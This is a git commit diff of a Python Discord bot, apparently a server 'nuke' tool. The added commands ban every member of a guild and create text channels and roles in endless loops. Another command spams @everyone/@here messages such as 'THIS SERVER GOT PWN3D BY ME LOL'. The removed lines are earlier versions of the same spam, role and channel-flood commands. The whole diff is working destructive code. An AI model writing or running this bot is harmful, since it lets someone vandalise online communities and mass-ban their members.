2fdadc30bf8602ff1d705c07399519299619ee6f
raiderman1 <47142963+jasonmichael13@users.noreply.github.com>
2020-07-29 01:11:10 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -4,20 +4,24 @@ from discord.ext import commands
 from discord.ext.commands import Bot
 bot = commands.Bot(command_prefix='*')
 @bot.command()
-async def spam(ctx):
-    while True:        
-        await ctx.send("lol noobs! @everyone @here")
-@bot.command(pass_cotext=True)
-async def roles(ctx):
-    await ctx.message.delete()
-    while True:
-        guild = ctx.guild
-        await guild.create_role(name="oh no")
-##MAKE CHANNELS##
-@bot.command(pass_context=True)
+async def ban(ctx):
+    for user in ctx.guild.members:
+        await user.ban()
+
+@bot.command()
 async def channels(ctx):
-    await ctx.message.delete()
     guild = ctx.message.guild
     while True:
-        await guild.create_text_channel('C Y K A H A CK E D')
+        await guild.create_text_channel('get rekt')
+
+@bot.command()
+async def roles(ctx):
+    role = ctx.guild
+    while True:
+        await role.create_role(name="get nuked")
+
+@bot.command()
+async def spam(ctx):
+    while True:
+        await ctx.send("THIS SERVER GOT PWN3D BY ME LOL @everyone @here")
 bot.run("ur token")
